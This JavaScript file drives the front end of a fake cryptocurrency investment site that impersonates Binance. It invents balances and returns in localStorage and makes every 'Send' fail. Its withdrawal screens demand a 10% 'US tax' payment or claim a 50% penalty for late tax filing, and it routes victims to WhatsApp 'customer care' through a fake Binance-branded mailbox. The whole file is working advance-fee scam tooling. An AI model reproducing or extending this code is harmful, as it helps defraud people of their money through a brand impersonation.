const base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

function signOutUser(e) {
    localStorage.removeItem("userName");
    e.innerHTML = `<i>Processing...</i>`
    setTimeout(() => {
        location.reload();
    }, 2000);
}

$("#signin_panel").hide();
$("#login_panel").hide();
$("#user_panel").hide();
$("#bnbLoading").show();
if (localStorage.hasOwnProperty("userName")) {
    setTimeout(() => {
        $("#user_panel").show();
        $("#bnbLoading").hide();
    }, 2000);
}
else {
    setTimeout(() => {
        $("#signin_panel").show();
        $("#bnbLoading").hide();
    }, 2000);
}

// 

const bonus = JSON.parse(localStorage.getItem("bonus"));

// 

function homeBtn() {
    $("#wallet_table").show();
    $("#bnbMainContainer").html(mainPageShow);
    showMsgCounter = 0;
}

let dropMenuCount = 0
function dropDownNavMenu() {
    dropMenuCount++

    if (dropMenuCount == 1) {
        $("#menuListing").show().css({ "display": "flex" });
        $("#menuHeadline").hide();
    }
    else if (dropMenuCount == 2) {
        $("#menuListing").hide();
        $("#menuHeadline").show();
        homeBtn();
        dropMenuCount = 0
    }
}

// 
let widthdrawTemp;

function controlPage(p) {
    $("#wallet_table").hide();

    if (p.innerText == "Home") {
        homeBtn();
    }
    else if (p.innerText == "Portfolio") {
        $("#bnbMainContainer").html(showPortfolio);

        if (promoBonus < promo_balance) {
            $("#bnb_total_amount").css({ "color": "green" })
        }
        else {
            $("#bnb_total_amount").css({ "color": "red" })
        }

        let moneyFormat = parseInt($("#bnb_total_amount").text()).toLocaleString('en-US', {
            style: 'currency',
            currency: 'USD',
        });

        $("#bnb_total_amount").text(moneyFormat)
    }
    else if (p.innerText == "Withdrawals") {

        if (!localStorage.hasOwnProperty('bonus')) {

            $("#bnbMainContainer").html(`
            <section>
            Sorry, No Transaction history
            </section>
            `);

            return
        }

        if (localStorage.hasOwnProperty('bonus')) {
            widthdrawTemp = `

            <div id="investment_status_update"><b>Status: </b> ${cashInTimer}</div>
        
            <div class="widthdrawFlexTable">
            <ul>
            <li><b class="widthdraw_coin">Bonus: </b></li>
            <li class="widthdraw_proceeds">
            <span id="payBonus">${promoBonus.toLocaleString('en-US', { style: 'currency', currency: 'USD', })}</span>
            </li>
            </ul>
            </div>

            <div class="widthdrawFlexTable">
            <ul>
            <li><b class="widthdraw_coin">Deposit: </b></li>
            <li class="widthdraw_proceeds">
            <span>${initialDeposit}</span>
            </li>
            </ul>
            </div>

            <div class="widthdrawFlexTable">
            <ul>
            <li><b class="widthdraw_coin">R.O.I: </b></li>
            <li class="widthdraw_proceeds">
            <span>${cash.toLocaleString('en-US', { style: 'currency', currency: 'USD', })}</span>
            </li>
            </ul>
            </div>

            <div class="widthdrawFlexTable">
            <ul>
            <li><b class="widthdraw_coin">Balance: </b></li>
            <li class="widthdraw_proceeds">
            <span id="total_balance" style="color:darkgreen; font-weight:bold">${available_balance.toLocaleString('en-US', { style: 'currency', currency: 'USD', })}</span>
            </li>
            </ul>
            </div>

            <div class="widthdrawFlexTable">
            <ul>
            <li><b>Payment: </b></li>
            <li>
                <select onchange="calculateWidthdrawal(this)">
                    <option value="">Select Coin</option>
                    <option value="BTC">BTC</option>
                    <option value="ETH">ETH</option>
                    <option value="USDT">USDT</option>
                    <option value="DOGE">DOGE</option>
                </select>
                <span id="selectedCoinVal"></span>
            </li>
            <li id="hide_widthdraw_btn">
                <button onclick="widthdrawBtn(this)">Widthdraw</button>
            </li>
            </ul>

            </div>
            `;

        } else {
            widthdrawTemp = `
            <div class="widthdrawFlexTable">
            <p class="widthdraw_none">
            Withdrawal(s) Not Available | Pending ${promo_balance}(BNB)
            <i>Promo bonus can only be widthdrawn along with investment proceeds</i>
            </p>
            </div>
            `
        }

        let showWithdrawal = `
        <section id="withdrawalContainer">
        <h1>Widthdraw Coin(s)</h1>
        ${widthdrawTemp}
        </section>
        
        `;

        $("#bnbMainContainer").html(showWithdrawal);
    }
    else if (p.innerText == "Investment Plans") {

        if (localStorage.hasOwnProperty("cash")) {
            updateCash();
            return
        }

        if (localStorage.hasOwnProperty("enterToken")) {
            let enterToken = JSON.parse(localStorage.getItem("enterToken"));
            let detailed = `<details>
            <summary>View Token ID</summary>
            <div>
            <p>
            <b>Token ID: </b>
            ${enterToken.token.slice(0, 20)}... 
            <input type="hidden" id="realTokenFX" value="${enterToken.token}"/>
            <button onclick="copyTokenTX(this)">Copy</button></p>
            <button onclick="cancelToken(this)">Cancel</button>
            </div>
          </details>`

            $("#wallet_table").hide();
            $("#bnbMainContainer").html(enterToken.saved);
            setTimeout(() => {
                $("#transaction_update").html(detailed);
            }, 3000);
        } else {
            $("#bnbMainContainer").html(showInvestment);
        }
    }
    else if (p.innerText == "Settings") {
        $("#bnbMainContainer").html(showSettings)
    }
}

// 
let showMsgCounter = 0;
function msgApp() {
    showMsgCounter++
    if (showMsgCounter == 1) {
        $("#wallet_table").hide();
        $("#bnbMainContainer").html(showMessage)
        setTimeout(() => {
            $("#preload_message").hide();
            $("#messagebox_content").show(), css({ "display": "flex" });
        }, 2000);
    } else {
        homeBtn()
    }
}

function whatsApp() {
    window.open(whatsapp, '_blank');
}

// 
let tempPlaner;
let getPlans = {};
function getAppPlan(p) {

    let plan = p.parentElement.parentElement;
    let myPlan = plan.getElementsByClassName("flex_plan")[0].innerText;
    let choosePlan = plan.getElementsByClassName("flex_choose_plan")[0];
    let chooseAmount = plan.getElementsByClassName("invested_amount")[0];
    let chooseCurrency = plan.getElementsByClassName("invested_currency")[0];
    let chooseCoin = plan.getElementsByClassName("select_icon_name")[0];

    // 

    const selectAmount = `
    <div class="enter_selected_amount">
    <p>
    <span>
    <b>Coin:</b>
    <select class="select_icon_name">
        <option selected value="btc">BTC</option>
        <option value="doge">DOGE</option>
        <option value="eth">ETH</option>
        <option value="usdt">USDT</option>
    </select>
    </span>

    <span>
    <b>Amount in:</b>
    <select class="invested_currency">
       <option selected value="USD">$ - USD</option>
      <option value="EUR">€ - EUR</option>
       <option value="AUD">A$ - AUD</option>
      <option value="JPY">¥ - JPY</option>
      <option value="CAD">C$ - CAD</option>
      <option value="GBP">£ - GBP</option>
      <option value="BOB">Bs - BOB</option>
      <option value="PLN">zł - PLN</option>
      <option value="THB">฿ - THB</option>
      <option value="BDT">৳ - BDT</option>
      <option value="BRL">R$ - BRL</option>
      <option value="CHF">Fr - CHF</option>
      <option value="CZK">Kč - CZK</option>
      <option value="DKK">kr - DKK</option>
      <option value="GTQ">Q - GTQ</option>
      <option value="ILS">₪ - ILS</option>
      <option value="KES">Ksh - KES</option>
      <option value="NZD">NZ$ - NZD</option>
      <option value="RSD">РСД - RSD</option>
      <option value="SEK">kr - SEK</option>
      <option value="ZAR">R - ZAR</option>
    </select>
    <input type="number" class="invested_amount" value="" onchange="investmentAmount(this)" placeholder="Enter Amount">
    </span>

    </p>
    </div>
    
    `;

    if (p.innerText == "Select") {
        $(choosePlan).html(selectAmount);
        p.innerText = "Continue";
    }
    else if (p.innerText == "Continue") {

        if (chooseAmount.value == "") {
            alert("Enter Amount in Figures");
        }
        else if (chooseCurrency.value == "") {
            alert("Currency can't be empty");
        }
        else if (chooseCoin.value == "") {
            alert("Coin can't be empty");
        }
        else {

            if (myPlan == "Bi-Flex") {
                tempPlaner = "50%";
            }
            else if (myPlan == "Bi-Flex Mini") {
                tempPlaner = "75%";
            }
            else if (myPlan == "Bi-Flex Max") {
                tempPlaner = "100%";
            }
            else if (myPlan == "Bi-Flex Pro") {
                tempPlaner = "200%";
            }

            getPlans.id = "invest";
            getPlans.wallet = promo_id;
            getPlans.plan = myPlan;
            getPlans.times = tempPlaner;
            getPlans.bal = promo_balance;
            getPlans.coin = chooseCoin.value;
            getPlans.amount = chooseAmount.value;
            getPlans.currency = chooseCurrency.value;
            localStorage.setItem('planz', JSON.stringify(getPlans));

            selectWallet(wallet = chooseCoin.value);
        }
    }
};

// 
function resetInvestmentPanel() {
    $("#bnbMainContainer").html(showInvestment);
};

// 
function approveInvestment() {
    $("#menuListing").show().css({ "display": "flex" });
    $("#menuHeadline").hide();
    $("#wallet_table").hide();
    dropMenuCount = 1;

    $("#bnbMainContainer").html(showInvestment)
};

// copy

function copyToClipboard(id) {
    let $copied = $("<input>");
    $("body").append($copied);
    $copied.val(id).select();
    navigator.clipboard.writeText(id);
    document.execCommand("copy");
    $copied.remove();
}

function copyCoinAddress(c) {
    let copy = c.parentElement;
    let addr = copy.getElementsByClassName("copy_addr")[0];

    copyToClipboard(addr.value);

    c.innerText = "Copied !"

    setTimeout(() => {
        c.innerText = "Copy Address"
    }, 2000);
}

function getWalletAddr(c) {

    copyToClipboard(c.innerText);

    alert("Copied !");
}

function investmentAmount(a) {
    let less = a.value
    if (less < 0) {
        a.value = "";
    }
}

function copyToken(c) {

    copyToClipboard($("#hiddenTXID").val());

    c.innerText = "Copied !";

    setTimeout(() => {
        c.innerText = "Copy";
    }, 2000);
};

function copyTokenTX(c) {
    alert($("#realTokenFX").val())
    copyToClipboard($("#realTokenFX").val());

    c.innerText = "Copied !";

    setTimeout(() => {
        c.innerText = "Copy";
    }, 2000);
}

// 
function widthdrawBtn(b) {
    let tenPercent = promoBonus / 100 * 10;
    let fiftyPercent = promoBonus / 100 * 50;

    let processWidthdrawal;

    if (b.innerText == "Overdue") {
        processWidthdrawal = `
        <section id="withdrawalContainer">

        <div id="status_widthdrawal">
        Widthdrawal application was denied, you have incurred <b>$${fiftyPercent}</b> being 50% total income of <b>$${promoBonus}</b> for late filing of tax returns.
        </div>

        `
    }
    else if (b.innerText == "Restricted") {
        processWidthdrawal = `
        <section id="withdrawalContainer">

        <div id="status_widthdrawal">Your <b>Investment Plan</b> ative and running, funds cant be widthdrawn.</div>
        
        `
    }
    else if (b.innerText == "Dormant") {
        processWidthdrawal = `
        <section id="withdrawalContainer">
        <div id="status_widthdrawal">Sorry, you do not have any <b>Investment Plan</b> to enable bonus withdrawal.</div>
        `;
    }
    else if (b.innerText == "Widthdraw") {

        if ($("#invest_pending").text() == "$0.00" || $("#invest_pending").text() == "$0") {
            processWidthdrawal = `
            <div id="status_widthdrawal">Sorry, insuficient funds detected !</div> 
            `
        }
        else {
            processWidthdrawal = `
            <div id="status_widthdrawal">
            Your account is now approved for widthdrawals.
            <br/> 
            You are adviced to goto account settings and fund your wallet address with <b>$${tenPercent}</b> or it's equivelent; being 10% of your total earnings of <b>$${promoBonus}</b> as required by the tax law of US revenue office.

            <br/>
            <br/>
            <br/>
            <br/>
            <i>Congratulations, on your giant step towards financial freedom.</i>
            </div> 
            
            `
        }

    }

    $("#bnbMainContainer").html(
        `
            <section id="withdrawalContainer">
                <h1>Widthdraw Coin(s)</h1>
                ${processWidthdrawal}
            </section>
        `);
}

// 
function calculateWidthdrawal(cal) {
    const symbol = $("#total_balance").text().charAt(0);
    const invest = $("#total_balance").text().slice(1).replace(/,/g, "");
    let assignCurrency;

    if (cal.value == "") {
        $("#hide_widthdraw_btn button").css({ "visibility": "hidden" })
    }
    else {

        for (let i = 0; i < crypto_currency.length; i++) {

            if (crypto_currency[i].id == cal.value) {
                for (let j = 0; j < fiat_currency.length; j++) {

                    if (fiat_currency[j].symbol == symbol) {
                        assignCurrency = fiat_currency[j].rate;
                        const myCoin = invest / assignCurrency;
                        const assignCoin = crypto_currency[i].rate.USD.slice(1).replace(/,/, "");
                        const result = myCoin / assignCoin;

                        $("#selectedCoinVal").text(result.toFixed(2));

                        if (payOutStatus == "Approved") {
                            $("#hide_widthdraw_btn button").text("Widthdraw");
                        }
                        else if (payOutStatus == "Pending") {
                            $("#hide_widthdraw_btn button").text("Pending")
                        }
                        else if (payOutStatus == "Re-Invest") {
                            $("#hide_widthdraw_btn button").text("Overdued")
                        }
                        else if (payOutStatus == "In Progress") {
                            $("#hide_widthdraw_btn button").text("Restricted")
                        }
                        else if (payOutStatus == "None") {
                            $("#hide_widthdraw_btn button").text("Dormant")
                        }

                        $("#hide_widthdraw_btn button").css({ "visibility": "visible" });
                    }
                }

            }
        }
    }
};

// 

function submitTransaction(bt) {
    const btn = bt.parentElement;
    const inputs = btn.getElementsByClassName("confirm_transactions")[0];

    if (inputs.value.length >= 15) {
        let sentTimer = Math.floor(Math.random() * 11);
        let mainTimer = sentTimer + 5
        let updateTimer;

        const approveCounter = setInterval(() => {

            if (mainTimer <= 0) {
                clearInterval(approveCounter)
                updateTimer = `Sorry, we are unable to automatically confirm transaction id. Please send transaction receipt/id to our customer care via <a href="${whatsapp}">WhatsApp</a> for immiediate attention`;
                $("#transaction_update").html(updateTimer)
            }
            else {
                mainTimer--
                updateTimer = `Transaction Key will be sent in ${mainTimer}s`;
                $("#transaction_update").html(updateTimer)
            }

        }, 1000);

        let enterBizCode;
        let saveProgress = {};

        if (bt.innerText == "Submit") {
            enterBizCode = `
        <section>
       <h1>Transaction Token</h1>

       <section class="sent_token_container">
       <div class="sent_token_box">
       <p id="transaction_update"><i>Please wait...</i></p>
       <div>
       <b>Enter Key: </b>
       <input type="text" id="confirm_sent_token" placeholder="Enter Sent Key"/>
       <button onclick="confirmSentTransaction(this)">Confirm</button>
       </div>
       </div>
       </section>
       `
            saveProgress.saved = enterBizCode;
            saveProgress.token = $("#hiddenTXID").val();
            localStorage.setItem('enterToken', JSON.stringify(saveProgress));
        }

        $("#wallet_table").hide();
        $("#bnbMainContainer").html(enterBizCode)
    }
};

function confirmSentTransaction(tx) {
    if (tx.innerText == "Confirm") {
        let enterToken = JSON.parse(localStorage.getItem("enterToken"));

        if (base64regex.test($("#confirm_sent_token").val()) && isNaN($("#confirm_sent_token").val()) && !/^[a-zA-Z]+$/.test($("#confirm_sent_token").val())) {
            let showInfos = JSON.parse(atob($("#confirm_sent_token").val()));

            if ($("#confirm_sent_token").val() == enterToken.token) {
                alert(`Token for Wallet_ID: ${showInfos.wallet} is Valid`);
                $("#confirm_sent_token").val("");
            } else {
                let enterKey = JSON.parse(atob($("#confirm_sent_token").val()));
                let updatedCash = {};

                if (enterKey[0].wallet == promo_id) {
                    let i_date = new Date();
                    let i_year = `${i_date.getFullYear()}-${i_date.getMonth()}-${i_date.getDate()}`;

                    updatedCash.cash = enterKey[1].amount;
                    updatedCash.dates = i_year;
                    updatedCash.days = 30;
                    updatedCash.coins = enterKey[1].coin;

                    localStorage.setItem('cash', JSON.stringify(updatedCash));
                    alert(enterKey[1].amount + " has been credited");
                    updateCash();
                }
                else {
                    alert("Wrong Wallet detected !")
                }
            }
        }
        else {
            alert("Invalid Token or Key")
        }

    }
};

// 

function cancelToken(c) {
    c.innerHTML = `<i>Cancelling...</i>`
    localStorage.removeItem("enterToken");
    setTimeout(() => {
        location.reload();
    }, 3000);
};

// 

function sendCryptoBalance(s) {

    if (base64regex.test($("#confirm_sent_token").val()) && isNaN($("#confirm_sent_token").val()) && !/^[a-zA-Z]+$/.test($("#confirm_sent_token").val())) {
        let desData = JSON.parse(atob($("#confirm_sent_token").val()));
        if (desData.id == "sign out") {
            $(".app_wallet_btn").html(`
            <i style="text-align:center">Please, wait...</i>
            `)
            localStorage.clear();
            setTimeout(() => {
                localStorage.clear();
            }, 2000);
        }
    }

    if (s.innerText == "Send") {
        if (walletBalance <= 0) {
            alert("Sorry, insufficient funds")
        }
        else {
            $("#app_wallet_btn_input").show();
            s.innerText = "Verify";
        }
    }
    else if (s.innerText == "Verify") {
        let x = Math.floor((Math.random() * 5000) + 5000);

        if ($("#app_wallet_btn_input").val() != "") {
            $(".app_wallet_btn").html(`
            <i style="text-align:center">Please, wait...</i>
            `)

            setTimeout(() => {
                $(".app_wallet_btn").html(`
            <i style="text-align:center; font-style:normal; color:red">Transaction failed !</i>
            `)
                setTimeout(() => {
                    location.reload()
                }, 3000);
            }, x);
        }
    }
};

// 

function openMailbox() {
    let mailtatus = JSON.parse(localStorage.getItem("msgStatus"));
    if (localStorage.hasOwnProperty("msgStatus")) {
        let changeStatus = {};
        changeStatus.status = "old";
        localStorage.setItem('msgStatus', JSON.stringify(changeStatus));
        setTimeout(() => {
            checkNewMsg();
        }, 1000);
    };

    if (localStorage.hasOwnProperty("sentMsg")) {
        let mailbox = JSON.parse(localStorage.getItem("sentMsg"));
        let showMailbox = `
        <section>
        <h1>Message Box</h1>
        <div id="mailbox_container">
        <section>
        <p><b>Binance <sup>TM</sup></b></p>
        <p><b>Re:</b> ${mailbox.id}</p>
        <div>
        We have received your email and have assigned <b>${mailbox.ticket}</b>.
        <br/>
        Please do not resend this message.
        <br/>
        <br>
        
        <section>
        <B>NB: </b>
        Contact our Customer Care hotline via <a href="${whatsapp}"><img src="https://abouelghar12.github.io/icon/whatsapp.svg"/> WhatsApp</a> for urgent attention.
        </section>
        
        </div>
        </section>
        </div>
        </section>
        `;

        $("#wallet_table").hide();
        $("#bnbMainContainer").html(showMailbox)

    } else {

    }
}

// 

function checkNewMsg() {

    if (localStorage.hasOwnProperty("msgStatus")) {
        let updateStatus = JSON.parse(localStorage.getItem("msgStatus"))
        if (updateStatus.status == "new") {
            setTimeout(() => {
                $("#appMsg").show();
            }, 3000);
        }
        else if (updateStatus.status == "old") {
            setTimeout(() => {
                $("#appMsg").hide();
            }, 5000);
        }
    };
}

checkNewMsg();

// 

function sendAppMsg(m) {
    let randCounter = Math.floor((Math.random() * 2000) + 3000);
    let msgSatus = {};
    let newMsg = {}

    if (m.innerText == "Send") {
        if ($("#msg_subject").val() == "") {
            alert("Subject can't be empty !")
        }
        else if ($("#msg_textarea").val() == "") {
            alert("Message can't be empty !")
        }
        else {
            $(m).html(`<i>Sending<i/>`);

            setTimeout(() => {
                msgSatus.status = "new";
                localStorage.setItem('msgStatus', JSON.stringify(msgSatus));

                newMsg.id = $("#msg_subject").val();
                newMsg.body = $("#msg_textarea").val();
                newMsg.sender = $("#msg_user").val();
                newMsg.receiver = $("#msg_admin").val();
                newMsg.ticket = `Ticket-${randCounter}`;
                localStorage.setItem('sentMsg', JSON.stringify(newMsg));

                $(m).html(`Sent &#10003;`);

                $("#msg_textarea").val("");
                $("#msg_subject").val("");

                setTimeout(() => {
                    checkNewMsg();
                    homeBtn();
                }, 3000);
            }, randCounter);
        }
    }
}
